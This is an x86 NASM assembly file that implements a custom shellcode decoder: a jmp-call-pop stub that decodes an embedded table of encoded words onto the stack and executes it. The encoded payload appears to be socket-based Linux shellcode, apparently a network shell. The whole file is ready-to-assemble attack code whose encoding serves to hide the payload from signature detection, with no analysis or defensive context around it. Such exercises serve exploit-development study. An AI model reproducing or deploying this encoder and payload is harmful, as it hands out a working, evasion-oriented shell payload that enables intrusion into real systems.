; Filename: custom-decoder.nasm
; Author:  Bo Pearce
;
;
; Purpose: 

global _start			

section .text
_start:
	
	jmp short shellcode

decoder:
	pop esi

	xor ecx, ecx
	xor ebx, ebx
	xor edi, edi
	mov bl, 0x2
	mul ecx

	mov edi, esi
	mov cl, 113

decode:
	mov ax, [esi]
	cmp ah, 0xfe
	je fe
	mov ah, 0x1
	jmp both
fe:
	xor ah, ah	
both:
	div bx
	sub ax, 0x1
	mov [esi], ax
	add esi, 0x2
	loop decode

	mov cl, 113
	sub esp, 125
	mov esi, esp

decode2:
	mov bl, [edi]
	mov [esi], bl 
	add esi, 0x1
	add edi, 0x2
	loop decode2	

	call esp

shellcode:
	call decoder
	payload: dw 0xfe64,0xff82,0xfe64,0xffb9,0xfe64,0xff94,0xfe64,0xffa6,0xff62,0xfece,0xff68,0xfe04,0xfed6,0xfe0e,0xfed6,0xfe04,0xfed6,0xfe06,0xff14,0xffc4,0xff9c,0xff02,0xff14,0xff8e,0xff62,0xfece,0xff68,0xfe06,0xfea6,0xfece,0xfed2,0xfe24,0xfeba,0xfece,0xfea8,0xff14,0xffc4,0xfed6,0xfe22,0xfea4,0xfeae,0xff14,0xffc4,0xff9c,0xff02,0xff68,0xfe0a,0xfed6,0xfe04,0xfeae,0xff14,0xffc4,0xff62,0xfece,0xff9c,0xff02,0xff68,0xfe0c,0xfea6,0xfea6,0xfeae,0xff14,0xffc4,0xff62,0xfece,0xff9c,0xff02,0xff14,0xff88,0xff14,0xffa4,0xff62,0xfe80,0xff9c,0xff02,0xff64,0xfe04,0xff62,0xfe80,0xff9c,0xff02,0xff64,0xfe06,0xff62,0xfe80,0xff9c,0xff02,0xfea6,0xfed2,0xfec6,0xfec4,0xfee8,0xfed2,0xfed2,0xfec6,0xfed4,0xfede,0xfe60,0xfed2,0xfe60,0xfe60,0xfe60,0xfe60,0xff14,0xffc8,0xfea6,0xfea8,0xff14,0xffc4,0xff62,0xfe18,0xff9c,0xff02